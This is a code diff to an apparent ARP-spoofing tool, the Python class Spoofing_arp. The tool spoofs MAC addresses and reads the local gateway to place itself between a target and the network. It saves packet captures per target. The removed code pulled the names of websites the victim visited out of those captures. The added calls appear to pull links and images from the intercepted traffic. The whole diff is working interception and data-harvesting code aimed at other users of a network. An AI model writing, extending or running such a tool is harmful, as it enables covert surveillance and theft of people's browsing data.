@@ -31,7 +31,7 @@ class Spoofing_arp:
            
            self.Host_info()
            self.arpSpoofing()
-          
+      
       def get_geteway(self):
           
            with open ('/proc/net/arp','r') as geteway :
@@ -51,7 +51,7 @@ class Spoofing_arp:
                        '00:26:B9:','14:FE:B5:','BC:30:5B:','D0:67:E5:',
                        '10:1D:C0:','78:25:AD:','A0:0B:BA:','E8:11:32:',
                        'F8:1E:DF:','E0:F8:47:','A4:B1:97:','7C:6D:62:',
-                        '00:0A:F3:','00:0C:86:','B4:A4:E3:','FC:FB:FB:',
+                       '00:0A:F3:','00:0C:86:','B4:A4:E3:','FC:FB:FB:',
                       ] 
                               
           Mac_list= random.choice(mac_list)                  
@@ -217,28 +217,8 @@ class Spoofing_arp:
                             time.sleep(1)
                             print("[*] PCAPNG Packet Capture saved at  Capture folder ...")
                     counted = 6 
-                    if os.path.exists("./capture/"+self.args.Target+"/roaming.txt"):
-                       os.remove("./capture/"+self.args.Target+"/roaming.txt")
-                    with open("./capture/"+self.args.Target+"/"+self.args.Target+".txt",'r') as  output :
-                          read_file = output.readlines()
-                    list=[]
-                    try:
-                        for line in read_file :
-                            if "Server Name:" in line  :
-                               list.append(line)
-                               list_all=set(list)
-                        roming = str("".join(list_all)).replace("Server Name:",'').replace("                     ","[+] ")
-                        with open("./capture/"+self.args.Target+"/roaming.txt",'w') as ip_1:
-                                ip_1.write(roming )
-                        id_user =  os.stat("./capture/"+self.args.Target+"/"+self.args.Target+".txt").st_uid 
-                        os.chown("./capture/"+self.args.Target+"/roaming.txt", id_user, id_user)
-                        print("[*] Website Name Vaist Saved at ./capture/"+self.args.Target+"/roaming.txt ")
-                    except Exception :
-                           with open("./capture/"+self.args.Target+"/roaming.txt",'w') as ip_1:
-                                  ip_1.write("No Website is Capture" )
-                           id_user =  os.stat("./capture/"+self.args.Target+"/"+self.args.Target+".txt").st_uid 
-                           os.chown("./capture/"+self.args.Target+"/roaming.txt", id_user, id_user)
-                           print("[*] Website Name Vaist Saved at ./capture/"+self.args.Target+"/roaming.txt ")     
+                    from Links import Gerp_Links
+                    run = Gerp_Links()
                     try:        
                        from image import ImagesDownLoad
                        run = ImagesDownLoad()
